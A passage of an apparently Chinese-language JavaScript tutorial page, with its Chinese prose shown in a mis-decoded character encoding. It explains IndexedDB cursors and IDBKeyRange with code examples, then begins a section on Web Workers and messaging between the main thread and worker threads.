    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>IDBCursor å¯¹è±¡çš„å±æ€§ã€‚</p> <ul><li><code>IDBCursor.source</code>ï¼šè¿”å›æ­£åœ¨éå†çš„å¯¹è±¡ä»“åº“æˆ–ç´¢å¼•ã€‚</li> <li><code>IDBCursor.direction</code>ï¼šå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæŒ‡é’ˆéå†çš„æ–¹å‘ã€‚å…±æœ‰å››ä¸ªå¯èƒ½çš„å€¼ï¼šnextï¼ˆä»å¤´å¼€å§‹å‘åéå†ï¼‰ã€nextuniqueï¼ˆä»å¤´å¼€å§‹å‘åéå†ï¼Œé‡å¤çš„å€¼åªéå†ä¸€æ¬¡ï¼‰ã€prevï¼ˆä»å°¾éƒ¨å¼€å§‹å‘å‰éå†ï¼‰ã€prevuniqueï¼ˆä»å°¾éƒ¨å¼€å§‹å‘å‰éå†ï¼Œé‡å¤çš„å€¼åªéå†ä¸€æ¬¡ï¼‰ã€‚è¯¥å±æ€§é€šè¿‡<code>IDBObjectStore.openCursor()</code>æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šï¼Œä¸€æ—¦æŒ‡å®šå°±ä¸èƒ½æ”¹å˜äº†ã€‚</li> <li><code>IDBCursor.key</code>ï¼šè¿”å›å½“å‰è®°å½•çš„ä¸»é”®ã€‚</li> <li><code>IDBCursor.value</code>ï¼šè¿”å›å½“å‰è®°å½•çš„æ•°æ®å€¼ã€‚</li> <li><code>IDBCursor.primaryKey</code>ï¼šè¿”å›å½“å‰è®°å½•çš„ä¸»é”®ã€‚å¯¹äºæ•°æ®ä»“åº“ï¼ˆobjectStoreï¼‰æ¥è¯´ï¼Œè¿™ä¸ªå±æ€§ç­‰åŒäº IDBCursor.keyï¼›å¯¹äºç´¢å¼•ï¼ŒIDBCursor.key è¿”å›ç´¢å¼•çš„ä½ç½®å€¼ï¼Œè¯¥å±æ€§è¿”å›æ•°æ®è®°å½•çš„ä¸»é”®ã€‚</li></ul> <p>IDBCursor å¯¹è±¡æœ‰å¦‚ä¸‹æ–¹æ³•ã€‚</p> <ul><li><code>IDBCursor.advance(n)</code>ï¼šæŒ‡é’ˆå‘å‰ç§»åŠ¨ n ä¸ªä½ç½®ã€‚</li> <li><code>IDBCursor.continue()</code>ï¼šæŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä¸ªä½ç½®ã€‚å®ƒå¯ä»¥æ¥å—ä¸€ä¸ªä¸»é”®ä½œä¸ºå‚æ•°ï¼Œè¿™æ—¶ä¼šè·³è½¬åˆ°è¿™ä¸ªä¸»é”®ã€‚</li> <li><code>IDBCursor.continuePrimaryKey()</code>ï¼šè¯¥æ–¹æ³•éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯<code>key</code>ï¼Œç¬¬äºŒä¸ªæ˜¯<code>primaryKey</code>ï¼Œå°†æŒ‡é’ˆç§»åˆ°ç¬¦åˆè¿™ä¸¤ä¸ªå‚æ•°çš„ä½ç½®ã€‚</li> <li><code>IDBCursor.delete()</code>ï¼šç”¨æ¥åˆ é™¤å½“å‰ä½ç½®çš„è®°å½•ï¼Œè¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚è¯¥æ–¹æ³•ä¸ä¼šæ”¹å˜æŒ‡é’ˆçš„ä½ç½®ã€‚</li> <li><code>IDBCursor.update()</code>ï¼šç”¨æ¥æ›´æ–°å½“å‰ä½ç½®çš„è®°å½•ï¼Œè¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚å®ƒçš„å‚æ•°æ˜¯è¦å†™å…¥æ•°æ®åº“çš„æ–°çš„å€¼ã€‚</li></ul> <h2 id="_11-idbkeyrange-å¯¹è±¡"><a href="#_11-idbkeyrange-å¯¹è±¡" class="header-anchor">#</a> 11.IDBKeyRange å¯¹è±¡</h2> <p>IDBKeyRange å¯¹è±¡ä»£è¡¨æ•°æ®ä»“åº“ï¼ˆobject storeï¼‰é‡Œé¢çš„ä¸€ç»„ä¸»é”®ã€‚æ ¹æ®è¿™ç»„ä¸»é”®ï¼Œå¯ä»¥è·å–æ•°æ®ä»“åº“æˆ–ç´¢å¼•é‡Œé¢çš„ä¸€ç»„è®°å½•ã€‚</p> <p>IDBKeyRange å¯ä»¥åªåŒ…å«ä¸€ä¸ªå€¼ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸Šé™å’Œä¸‹é™ã€‚å®ƒæœ‰å››ä¸ªé™æ€æ–¹æ³•ï¼Œç”¨æ¥æŒ‡å®šä¸»é”®çš„èŒƒå›´ã€‚</p> <ul><li><code>IDBKeyRange.lowerBound()</code>ï¼šæŒ‡å®šä¸‹é™ã€‚</li> <li><code>IDBKeyRange.upperBound()</code>ï¼šæŒ‡å®šä¸Šé™ã€‚</li> <li><code>IDBKeyRange.bound()</code>ï¼šåŒæ—¶æŒ‡å®šä¸Šä¸‹é™ã€‚</li> <li><code>IDBKeyRange.only()</code>ï¼šæŒ‡å®šåªåŒ…å«ä¸€ä¸ªå€¼ã€‚</li></ul> <p>ä¸‹é¢æ˜¯ä¸€äº›ä»£ç å®ä¾‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// All keys â‰¤ x</span>
<span class="token keyword">var</span> r1 <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">upperBound</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// All keys &lt; x</span>
<span class="token keyword">var</span> r2 <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">upperBound</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// All keys â‰¥ y</span>
<span class="token keyword">var</span> r3 <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">lowerBound</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// All keys &gt; y</span>
<span class="token keyword">var</span> r4 <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">lowerBound</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// All keys â‰¥ x &amp;&amp; â‰¤ y</span>
<span class="token keyword">var</span> r5 <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">bound</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// All keys &gt; x &amp;&amp;&lt; y</span>
<span class="token keyword">var</span> r6 <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">bound</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// All keys &gt; x &amp;&amp; â‰¤ y</span>
<span class="token keyword">var</span> r7 <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">bound</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// All keys â‰¥ x &amp;&amp;&lt; y</span>
<span class="token keyword">var</span> r8 <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">bound</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// The key = z</span>
<span class="token keyword">var</span> r9 <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">only</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p><code>IDBKeyRange.lowerBound()</code>ã€<code>IDBKeyRange.upperBound()</code>ã€<code>IDBKeyRange.bound()</code>è¿™ä¸‰ä¸ªæ–¹æ³•é»˜è®¤åŒ…æ‹¬ç«¯ç‚¹å€¼ï¼Œå¯ä»¥ä¼ å…¥ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œä¿®æ”¹è¿™ä¸ªå±æ€§ã€‚</p> <p>ä¸ä¹‹å¯¹åº”ï¼ŒIDBKeyRange å¯¹è±¡æœ‰å››ä¸ªåªè¯»å±æ€§ã€‚</p> <ul><li><code>IDBKeyRange.lower</code>ï¼šè¿”å›ä¸‹é™</li> <li><code>IDBKeyRange.lowerOpen</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºä¸‹é™æ˜¯å¦ä¸ºå¼€åŒºé—´ï¼ˆå³ä¸‹é™æ˜¯å¦æ’é™¤åœ¨èŒƒå›´ä¹‹å¤–ï¼‰</li> <li><code>IDBKeyRange.upper</code>ï¼šè¿”å›ä¸Šé™</li> <li><code>IDBKeyRange.upperOpen</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºä¸Šé™æ˜¯å¦ä¸ºå¼€åŒºé—´ï¼ˆå³ä¸Šé™æ˜¯å¦æ’é™¤åœ¨èŒƒå›´ä¹‹å¤–ï¼‰</li></ul> <p>IDBKeyRange å®ä¾‹å¯¹è±¡ç”Ÿæˆä»¥åï¼Œå°†å®ƒä½œä¸ºå‚æ•°è¾“å…¥ IDBObjectStore æˆ– IDBIndex å¯¹è±¡çš„<code>openCursor()</code>æ–¹æ³•ï¼Œå°±å¯ä»¥åœ¨æ‰€è®¾å®šçš„èŒƒå›´å†…è¯»å–æ•°æ®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> t <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'people'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readonly'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> store <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'people'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> index <span class="token operator">=</span> store<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> range <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">bound</span><span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

index<span class="token punctuation">.</span><span class="token function">openCursor</span><span class="token punctuation">(</span>range<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> cursor <span class="token operator">=</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>cursor<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cursor<span class="token punctuation">.</span>key <span class="token operator">+</span> <span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> field <span class="token keyword">in</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cursor<span class="token punctuation">.</span>value<span class="token punctuation">[</span>field<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    cursor<span class="token punctuation">.</span><span class="token function">continue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>IDBKeyRange æœ‰ä¸€ä¸ªå®ä¾‹æ–¹æ³•<code>includes(key)</code>ï¼Œè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæŸä¸ªä¸»é”®æ˜¯å¦åŒ…å«åœ¨å½“å‰è¿™ä¸ªä¸»é”®ç»„ä¹‹å†…ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> keyRangeValue <span class="token operator">=</span> IDBKeyRange<span class="token punctuation">.</span><span class="token function">bound</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

keyRangeValue<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'F'</span><span class="token punctuation">)</span> <span class="token comment">// true</span>
keyRangeValue<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'W'</span><span class="token punctuation">)</span> <span class="token comment">// false</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="åä¸‰ã€web-worker"><a href="#åä¸‰ã€web-worker" class="header-anchor">#</a> åä¸‰ã€Web Worker</h2> <h2 id="_1-æ¦‚è¿°-6"><a href="#_1-æ¦‚è¿°-6" class="header-anchor">#</a> 1.æ¦‚è¿°</h2> <p>JavaScript è¯­è¨€é‡‡ç”¨çš„æ˜¯å•çº¿ç¨‹æ¨¡å‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰ä»»åŠ¡åªèƒ½åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸Šå®Œæˆï¼Œä¸€æ¬¡åªèƒ½åšä¸€ä»¶äº‹ã€‚å‰é¢çš„ä»»åŠ¡æ²¡åšå®Œï¼Œåé¢çš„ä»»åŠ¡åªèƒ½ç­‰ç€ã€‚éšç€ç”µè„‘è®¡ç®—èƒ½åŠ›çš„å¢å¼ºï¼Œå°¤å…¶æ˜¯å¤šæ ¸ CPU çš„å‡ºç°ï¼Œå•çº¿ç¨‹å¸¦æ¥å¾ˆå¤§çš„ä¸ä¾¿ï¼Œæ— æ³•å……åˆ†å‘æŒ¥è®¡ç®—æœºçš„è®¡ç®—èƒ½åŠ›ã€‚</p> <p>Web Worker çš„ä½œç”¨ï¼Œå°±æ˜¯ä¸º JavaScript åˆ›é€ å¤šçº¿ç¨‹ç¯å¢ƒï¼Œå…è®¸ä¸»çº¿ç¨‹åˆ›å»º Worker çº¿ç¨‹ï¼Œå°†ä¸€äº›ä»»åŠ¡åˆ†é…ç»™åè€…è¿è¡Œã€‚åœ¨ä¸»çº¿ç¨‹è¿è¡Œçš„åŒæ—¶ï¼ŒWorker çº¿ç¨‹åœ¨åå°è¿è¡Œï¼Œä¸¤è€…äº’ä¸å¹²æ‰°ã€‚ç­‰åˆ° Worker çº¿ç¨‹å®Œæˆè®¡ç®—ä»»åŠ¡ï¼Œå†æŠŠç»“æœè¿”å›ç»™ä¸»çº¿ç¨‹ã€‚è¿™æ ·çš„å¥½å¤„æ˜¯ï¼Œä¸€äº›è®¡ç®—å¯†é›†å‹æˆ–é«˜å»¶è¿Ÿçš„ä»»åŠ¡å¯ä»¥äº¤ç”± Worker çº¿ç¨‹æ‰§è¡Œï¼Œä¸»çº¿ç¨‹ï¼ˆé€šå¸¸è´Ÿè´£ UI äº¤äº’ï¼‰èƒ½å¤Ÿä¿æŒæµç•…ï¼Œä¸ä¼šè¢«é˜»å¡æˆ–æ‹–æ…¢ã€‚</p> <p>Worker çº¿ç¨‹ä¸€æ—¦æ–°å»ºæˆåŠŸï¼Œå°±ä¼šå§‹ç»ˆè¿è¡Œï¼Œä¸ä¼šè¢«ä¸»çº¿ç¨‹ä¸Šçš„æ´»åŠ¨ï¼ˆæ¯”å¦‚ç”¨æˆ·ç‚¹å‡»æŒ‰é’®ã€æäº¤è¡¨å•ï¼‰æ‰“æ–­ã€‚è¿™æ ·æœ‰åˆ©äºéšæ—¶å“åº”ä¸»çº¿ç¨‹çš„é€šä¿¡ã€‚ä½†æ˜¯ï¼Œè¿™ä¹Ÿé€ æˆäº† Worker æ¯”è¾ƒè€—è´¹èµ„æºï¼Œä¸åº”è¯¥è¿‡åº¦ä½¿ç”¨ï¼Œè€Œä¸”ä¸€æ—¦ä½¿ç”¨å®Œæ¯•ï¼Œå°±åº”è¯¥å…³é—­ã€‚</p> <p>Web Worker æœ‰ä»¥ä¸‹å‡ ä¸ªä½¿ç”¨æ³¨æ„ç‚¹ã€‚</p> <p>ï¼ˆ1ï¼‰<strong>åŒæºé™åˆ¶</strong></p> <p>åˆ†é…ç»™ Worker çº¿ç¨‹è¿è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¿…é¡»ä¸ä¸»çº¿ç¨‹çš„è„šæœ¬æ–‡ä»¶åŒæºã€‚</p> <p>ï¼ˆ2ï¼‰<strong>DOM é™åˆ¶</strong></p> <p>Worker çº¿ç¨‹æ‰€åœ¨çš„å…¨å±€å¯¹è±¡ï¼Œä¸ä¸»çº¿ç¨‹ä¸ä¸€æ ·ï¼Œæ— æ³•è¯»å–ä¸»çº¿ç¨‹æ‰€åœ¨ç½‘é¡µçš„ DOM å¯¹è±¡ï¼Œä¹Ÿæ— æ³•ä½¿ç”¨<code>document</code>ã€<code>window</code>ã€<code>parent</code>è¿™äº›å¯¹è±¡ã€‚ä½†æ˜¯ï¼ŒWorker çº¿ç¨‹å¯ä»¥ä½¿ç”¨<code>navigator</code>å¯¹è±¡å’Œ<code>location</code>å¯¹è±¡ã€‚</p> <p>ï¼ˆ3ï¼‰<strong>å…¨å±€å¯¹è±¡é™åˆ¶</strong></p> <p>Worker çš„å…¨å±€å¯¹è±¡<code>WorkerGlobalScope</code>ï¼Œä¸åŒäºç½‘é¡µçš„å…¨å±€å¯¹è±¡<code>Window</code>ï¼Œå¾ˆå¤šæ¥å£æ‹¿ä¸åˆ°ã€‚æ¯”å¦‚ï¼Œç†è®ºä¸Š Worker çº¿ç¨‹ä¸èƒ½ä½¿ç”¨<code>console.log</code>ï¼Œå› ä¸ºæ ‡å‡†é‡Œé¢æ²¡æœ‰æåˆ° Worker çš„å…¨å±€å¯¹è±¡å­˜åœ¨<code>console</code>æ¥å£ï¼Œåªå®šä¹‰äº†<code>Navigator</code>æ¥å£å’Œ<code>Location</code>æ¥å£ã€‚ä¸è¿‡ï¼Œæµè§ˆå™¨å®é™…ä¸Šæ”¯æŒ Worker çº¿ç¨‹ä½¿ç”¨<code>console.log</code>ï¼Œä¿é™©çš„åšæ³•è¿˜æ˜¯ä¸ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p> <p>ï¼ˆ4ï¼‰<strong>é€šä¿¡è”ç³»</strong></p> <p>Worker çº¿ç¨‹å’Œä¸»çº¿ç¨‹ä¸åœ¨åŒä¸€ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œå®ƒä»¬ä¸èƒ½ç›´æ¥é€šä¿¡ï¼Œå¿…é¡»é€šè¿‡æ¶ˆæ¯å®Œæˆã€‚</p> <p>ï¼ˆ5ï¼‰<strong>è„šæœ¬é™åˆ¶</strong></p> <p>Worker çº¿ç¨‹ä¸èƒ½æ‰§è¡Œ<code>alert()</code>æ–¹æ³•å’Œ<code>confirm()</code>æ–¹æ³•ï¼Œä½†å¯ä»¥ä½¿ç”¨ XMLHttpRequest å¯¹è±¡å‘å‡º AJAX è¯·æ±‚ã€‚</p> <p>ï¼ˆ6ï¼‰<strong>æ–‡ä»¶é™åˆ¶</strong></p> <p>Worker çº¿ç¨‹æ— æ³•è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå³ä¸èƒ½æ‰“å¼€æœ¬æœºçš„æ–‡ä»¶ç³»ç»Ÿï¼ˆ<code>file://</code>ï¼‰ï¼Œå®ƒæ‰€åŠ è½½çš„è„šæœ¬ï¼Œå¿…é¡»æ¥è‡ªç½‘ç»œã€‚</p> <h2 id="_2-åŸºæœ¬ç”¨æ³•"><a href="#_2-åŸºæœ¬ç”¨æ³•" class="header-anchor">#</a> 2.åŸºæœ¬ç”¨æ³•</h2> <h3 id="ä¸»çº¿ç¨‹"><a href="#ä¸»çº¿ç¨‹" class="header-anchor">#</a> ä¸»çº¿ç¨‹</h3> <p>ä¸»çº¿ç¨‹é‡‡ç”¨<code>new</code>å‘½ä»¤ï¼Œè°ƒç”¨<code>Worker()</code>æ„é€ å‡½æ•°ï¼Œæ–°å»ºä¸€ä¸ª Worker çº¿ç¨‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">'work.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><code>Worker()</code>æ„é€ å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°±æ˜¯ Worker çº¿ç¨‹æ‰€è¦æ‰§è¡Œçš„ä»»åŠ¡ã€‚ç”±äº Worker ä¸èƒ½è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™ä¸ªè„šæœ¬å¿…é¡»æ¥è‡ªç½‘ç»œã€‚å¦‚æœä¸‹è½½æ²¡æœ‰æˆåŠŸï¼ˆæ¯”å¦‚404é”™è¯¯ï¼‰ï¼ŒWorker å°±ä¼šé»˜é»˜åœ°å¤±è´¥ã€‚</p> <p>ç„¶åï¼Œä¸»çº¿ç¨‹è°ƒç”¨<code>worker.postMessage()</code>æ–¹æ³•ï¼Œå‘ Worker å‘æ¶ˆæ¯ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Hello World'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">{</span>method<span class="token operator">:</span> <span class="token string">'echo'</span><span class="token punctuation">,</span> args<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'Work'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><code>worker.postMessage()</code>æ–¹æ³•çš„å‚æ•°ï¼Œå°±æ˜¯ä¸»çº¿ç¨‹ä¼ ç»™ Worker çš„æ•°æ®ã€‚å®ƒå¯ä»¥æ˜¯å„ç§æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬äºŒè¿›åˆ¶æ•°æ®ã€‚</p> <p>æ¥ç€ï¼Œä¸»çº¿ç¨‹é€šè¿‡<code>worker.onmessage</code>æŒ‡å®šç›‘å¬å‡½æ•°ï¼Œæ¥æ”¶å­çº¿ç¨‹å‘å›æ¥çš„æ¶ˆæ¯ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>worker<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">doSomething</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// æ‰§è¡Œä»»åŠ¡</span>
  worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'Work done!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œäº‹ä»¶å¯¹è±¡çš„<code>data</code>å±æ€§å¯ä»¥è·å– Worker å‘æ¥çš„æ•°æ®ã€‚</p> <p>Worker å®Œæˆä»»åŠ¡ä»¥åï¼Œä¸»çº¿ç¨‹å°±å¯ä»¥æŠŠå®ƒå…³æ‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>worker<span class="token punctuation">.</span><span class="token function">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="worker-çº¿ç¨‹"><a href="#worker-çº¿ç¨‹" class="header-anchor">#</a> Worker çº¿ç¨‹</h3> <p>Worker çº¿ç¨‹å†…éƒ¨éœ€è¦æœ‰ä¸€ä¸ªç›‘å¬å‡½æ•°ï¼Œç›‘å¬<code>message</code>äº‹ä»¶ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'You said: '</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>self</code>ä»£è¡¨å­çº¿ç¨‹è‡ªèº«ï¼Œå³å­çº¿ç¨‹çš„å…¨å±€å¯¹è±¡ã€‚å› æ­¤ï¼Œç­‰åŒäºä¸‹é¢ä¸¤ç§å†™æ³•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// å†™æ³•ä¸€</span>
<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'You said: '</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
